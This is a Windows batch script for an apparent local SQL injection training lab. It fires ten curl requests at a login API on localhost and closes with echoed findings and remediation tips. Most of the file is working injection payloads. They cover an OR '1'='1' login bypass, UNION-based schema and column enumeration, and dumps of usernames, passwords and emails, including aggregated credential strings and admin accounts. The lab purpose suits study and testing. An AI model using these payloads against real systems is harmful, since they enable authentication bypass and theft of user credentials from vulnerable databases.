@echo off
cls
echo.
echo ===============================================
echo   Manual SQL Injection Testing - Level 1
echo ===============================================
echo.

echo 🎯 Testing Basic String Injection Manually
echo 🌐 Target: http://localhost:3000/api/level1
echo.

echo 📋 Phase 1: Basic Authentication Bypass
echo ======================================
echo.

echo 🔍 Test 1: Classic OR injection
echo Payload: admin' OR '1'='1' --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' OR '1'='1' --\",\"password\":\"anything\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 2: Union-based injection detection
echo Payload: admin' UNION SELECT 1,2,3,4,5,6 --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT 1,2,3,4,5,6 --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 3: Information schema enumeration
echo Payload: admin' UNION SELECT table_name,null,null,null,null,null FROM information_schema.tables --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT table_name,null,null,null,null,null FROM information_schema.tables --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 4: Column enumeration
echo Payload: admin' UNION SELECT column_name,null,null,null,null,null FROM information_schema.columns WHERE table_name='users' --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT column_name,null,null,null,null,null FROM information_schema.columns WHERE table_name='users' --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 5: Data extraction
echo Payload: admin' UNION SELECT username,password,email,first_name,last_name,role FROM users --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT username,password,email,first_name,last_name,role FROM users --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 📊 Phase 2: Database Information Gathering
echo ========================================
echo.

echo 🔍 Test 6: Database version
echo Payload: admin' UNION SELECT version(),null,null,null,null,null --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT version(),null,null,null,null,null --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 7: Current user
echo Payload: admin' UNION SELECT current_user,null,null,null,null,null --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT current_user,null,null,null,null,null --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 8: Database name
echo Payload: admin' UNION SELECT current_database(),null,null,null,null,null --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT current_database(),null,null,null,null,null --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🛡️ Phase 3: Advanced Exploitation
echo ===============================
echo.

echo 🔍 Test 9: Multiple rows extraction
echo Payload: admin' UNION SELECT string_agg(username||':'||password, ','),null,null,null,null,null FROM users --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT string_agg(username||':'||password, ','),null,null,null,null,null FROM users --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo 🔍 Test 10: Admin users only
echo Payload: admin' UNION SELECT username,password,email,role,null,null FROM users WHERE role='admin' --
curl -X POST http://localhost:3000/api/level1 ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin' UNION SELECT username,password,email,role,null,null FROM users WHERE role='admin' --\",\"password\":\"test\"}" ^
  -w "\nHTTP Status: %%{http_code}\n"

echo.
echo ===============================================
echo   Manual Testing Complete!
echo ===============================================
echo.
echo 📊 Summary:
echo ├── ✅ Authentication bypass tested
echo ├── ✅ Union injection confirmed
echo ├── ✅ Database information extracted
echo ├── ✅ Table structure discovered
echo ├── ✅ Sensitive data retrieved
echo └── ✅ Advanced payloads tested
echo.
echo 🔍 Key Findings:
echo ├── Vulnerability: String-based SQL Injection
echo ├── Location: username parameter
echo ├── Database: PostgreSQL
echo ├── Tables: users, logs, admin_settings
echo └── Risk: CRITICAL - Full database access
echo.
echo 🛡️ Remediation:
echo 1. Use parameterized queries
echo 2. Implement input validation
echo 3. Apply principle of least privilege
echo 4. Add WAF protection
echo 5. Monitor for injection attempts
echo.
pause
